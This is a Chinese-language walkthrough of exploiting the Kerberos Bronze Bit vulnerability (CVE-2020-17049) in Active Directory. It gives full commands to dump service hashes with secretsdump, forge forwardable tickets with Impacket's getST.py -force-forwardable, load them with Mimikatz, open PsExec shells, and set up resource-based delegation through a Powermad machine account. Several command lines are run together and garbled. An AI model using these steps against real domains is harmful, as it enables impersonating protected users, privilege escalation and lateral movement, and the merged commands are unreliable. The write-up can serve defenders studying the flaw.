CVE-2020-17049: Kerberos Bronze Bit攻击

本文讲述了如何利用Kerberos Bronze Bit漏洞（CVE-2020-17049）进行攻击。


Microsoft在2020年11月10日发布了该漏洞的补丁程序，补丁发布持续到2021年2月9日。以下攻击情形假设域控制器没有这个补丁，攻击者正在发起攻击。


Bronze Bit漏洞启用的攻击是Kerberos委派引起的其他已知攻击的扩展。Bronze Bit漏洞绕过了现有攻击路径的两种可能的缓解措施，从而提高了其有效性和攻击性。攻击者现在可以执行以下操作：


  • 攻击者可以模拟 “受保护用户”组的成员以及 “账户敏感且无法委派”配置的用户。

  • 攻击者可以禁止执行身份验证协议转换的服务，发起攻击。这意味着，如果配置的服务没有“ TrustedToAuthForDelegation”属性（在AD GUI中显示为“信任此用户，仅委派指定的服务（Trust this user for delegation to specified services only）——仅使用Kerberos”），则攻击者可以利用漏洞来获取票据，就和设置了“ TrustedToAuthForDelegation”属性一样。





通用攻击路径



该漏洞的通用攻击路径如下：


1) 攻击者在AD环境中有攻击据点。


2) 攻击者获取环境里的服务密码哈希。我们将此服务称为“ Service1”。攻击者可以通过多种方式获取必要的哈希，如DC Sync攻击，Kerberoasting，甚至可以通过Powermad用SPN创建新的计算机帐户。


3）Service1与另一个服务具有受约束的委派信任关系。我们将其称为“ Service2”。此信任关系可以是以下其中一种：

a. 把Service1配置为对Service2进行约束委派。也就是说，Service2在Service1的“ AllowedToDelegateTo”列表中。

b. 把Service2配置为接受Service1基于资源的约束委派。也就是说，Service1在Service2的“ PrincipalsAllowedToDelegateToAccount”列表中。

    i. 如果攻击者对AD中的Service2对象具有写入权限（GenericAll，GenericWrite，WriteOwner等），则攻击者可以将Service1添加到Service2的“ PrincipalsAllowedToDelegateToAccount”列表中。这不需要域管理员特权。


4) 攻击者利用此漏洞充当Service1，并获得Kerberos服务票据作为Service2的目标用户。


5) 攻击者冒充目标用户，向Service2提供服务票据。攻击者现在已作为目标用户向Service2进行身份验证，并且可以在目标用户的权限下与Service2进行交互。





漏洞的利用



Bronze Bit漏洞是Impacket框架的延伸。新漏洞利用功能目前正等着pull请求的合并。Impacket内有很多强大的功能，但是我们感兴趣的是getST.py。我们首先回顾一下没有利用漏洞的程序功能。我们从上面提到的步骤4直接跳到攻击路径。假设我们已经获得了Service1的哈希值，Service1与Service2的委派信任关系受限，我们正在寻求以目标用户的身份访问Service2。


可以使用getST.py程序执行S4U交换，以指定用户的身份获得指定服务的服务票据。如果允许Service1执行协议转换（即使用“ TrustedToAuthForDelegation”进行配置），保护用户免受委托，执行过程如下：



攻击者可以利用最终的服务票据，模拟目标用户和Service2进行交互。但是，如果不允许Service1执行协议转换或保护用户免受委托，那么在S4U2self交换中获得的中间服务票据将不可转发，导致S4U2proxy请求失败。






-force-forwardable标识



Bronze Bit漏洞是getST.py的扩展。添加一个新的-force-forwardable标识，可以将其作为命令行参数传递。如果存在-force-forwardable标识，S4U2self交换之后，执行漏洞利用。由KDC在S4U2self交换中返回的服务票据用Service1的长期密钥解密、可转发标志集进行解密，然后重新加密。更改后的票据会附加在S4U2proxy交换中，KDC将作为目标用户返回Service2的服务票据。



绕过限制并准备好服务票据后，攻击者可以模拟目标用户和Service2进行交互（请见攻击路径中的步骤5）。

执行攻击


退出域控制器，以User1身份登录Service1服务器。建立攻击据点（像上述的攻击路径步骤1 那样）。启动PowerShell会话，确保当前User1和Service1无法在其自己的授权下访问Service2。


命令：


whoamils \\service2.test.local\c$.\PSTools\PsExec64.exe \\service2.test.local\ powershell.exe


执行：



我们已经确认User1无法直接访问Service2。继续攻击路径的步骤2：获取Service1的哈希值。在这种情况下，我们会用到Impacket的secretsdump.py程序来获取Service1服务器帐户的AES256-CTS-HMAC-SHA1-96和LM：NTLM的哈希。


命令：


python .\impacket\examples\secretsdump.py 'test/user1:<user1_password>@Service1.test.local'


执行：



在获得必要的哈希后，尝试在没有-force-forwardable标识的情况下执行getST.py程序。显然，这行不通。如前面所述，S4U2self交换把服务票据返回给User2的Service1，但是由于服务的委派限制和用户免受委派，未能设置该票据的Forwardable标志。票据在S4U2proxy交换中用作证据时，会出现错误。


命令：


.\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1


执行：



这是攻击路径步骤4。重复前面的命令，但这次包括-force-forwardable命令行参数。


命令:


.\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable


执行：



以下是输出：


Service ticket from S4U2self flags: 00000000101000010000000000000000Service ticket from S4U2self is not forwardableForcing the service ticket to be forwardableService ticket flags after modification: 01000000101000010000000000000000Service ticket from S4U2self now is forwardable


包含-force-forwardable标识后，该漏洞利用会自动执行，把从S4U2self交换收到的服务票据转换为可转发票据。这要通过解密Service1的哈希值，把标识值的第二个位从0改为1，并重新加密票据来完成。可转发票据在S4U2proxy交换中发送，作为User2的Service2的服务票据被返回，然后写入User2.ccache的磁盘。


接下来，用Mimikatz把服务票据加载到票据缓存中使用。加载完后， Mimikatz会确认这是User2到Service2的cifs服务的有效票据。


命令：


.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit


执行：



将服务票据添加到缓存后，就能像User2一样访问Service2。我们拥有User2在Service2上的所有权限。我们将使用Mark Russinovich的PSExec在Service2服务器上获取PowerShell会话，并运行命令。这是攻击路径的最后一个步骤。


命令：


ls \\service2.test.local\c$.\PSTools\PsExec64.exe \\service2.test.local\ powershell.exewhoamihostname


执行:



我们已经成功滥用了Kerberos委派，通过模拟受保护用户来提升我们的特权并攻击其他服务。






示例攻击2



接下来探索另一条具有不同起始条件的攻击路径。在攻击Service2时，我们需要AD里的Service2的全部写入权限。


环境配置


我们将继续使用上一个示例中的环境，但会做一些修改。目标User2帐户可以把其配置设为“受保护用户”成员的身份，或“帐户敏感且无法委派”。


首先删除Service1的委派权限。连接DC，并把Service1配置为“不信任此计算机进行委派”。



编辑Service2计算机对象， 授予User1写入权限。当我们直接向据点用户授予权限时，用户通常通过特权组的成员身份获得对一个或多个AD对象的写入权限。用户不一定是域管理员。



执行攻击


退出域控制器，以User1身份登录Service1服务器。像以前一样，这模拟了在环境中的据点（“攻击路径”中的步骤1 ）。如果你是接在第一个示例后面继续操作的，请确保清除本地Kerberos票据缓存。清除缓存的最有效方法就是重启Service1。


与我们之前的示例不同，此攻击不会利用Service1和Service2之间的任何委派信任关系。把Service1配置为“不信任此计算机进行委派”之后，信任关系不复存在。我们要和Service2建立新的委派关系，这是一种全新的服务。


在环境中创建一个新服务，我们要用Kevin Robertson的Powermad创建一个新的计算机帐户。这不需要提权，默认情况下，域中的任何用户均可使用。我们将机器帐户命名为“ AttackerService”，并提供一个任意密码：“ AttackerServicePassword”。


命令：


Import-Module .\Powermad\powermad.ps1New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)


执行：



由于我们选择了新机器帐户的密码，因此我们可以使用Mimikatz轻松计算出相应的密码哈希。这样就能完成攻击路径的步骤2。


命令：


.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit


执行：



用PowerShell Active Directory模块检查我们新创建的计算机帐户。由于该模块尚不可用，所以需要安装相应的功能，导入该模块，然后检查我们新创建的计算机帐户。


命令：


Install-WindowsFeature RSAT-AD-PowerShellImport-Module ActiveDirectoryGet-ADComputer AttackerService


执行：



确认计算机帐户的存在之后，我们可以在Service2和AttackerService之间建立受约束的委派信任关系。因为User1（我们的受控据点帐户）对Service2对象具有写入权限，所以我们可以把AttackerService添加到Service2的PrincipalsAllowedToDelegateToAccount列表中。这将在Service2上建立基于资源的约束委派，并从AttackerService接受约束委派。完成此步骤后，我们就满足了攻击路径步骤3的条件。


命令：


Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount


执行：



我们准备继续执行攻击路径的步骤4，执行漏洞利用。我们会用到与上一个示例相同的命令，但是这次指定AttackerService而不是Service1，并且用Mimikatz计算哈希值。当命令包含-force-forwardable标识时，我们将看到与上一个示例相同的结果。执行漏洞利用，设置可转发标识，并将作为User2的Service2的服务票据写入User2.ccache的磁盘。


命令：


python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$


执行：


现在，我们可以重复上一个示例中的最终命令。通过使用Mimikatz将服务票据加载到本地Kerberos票据缓存中，为攻击路径的步骤5做准备。然后，通过与Service2进行交互（模拟User2）来执行步骤5。


命令：


.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Nullls \\service2.test.local\c$.\PSTools\PsExec64.exe \\service2.test.local\ powershell.exewhoamihostname


执行：



有了Service2 AD对象的起始据点和写入权限，即使用户权限受委托保护，我们还是可以用来攻击服务。
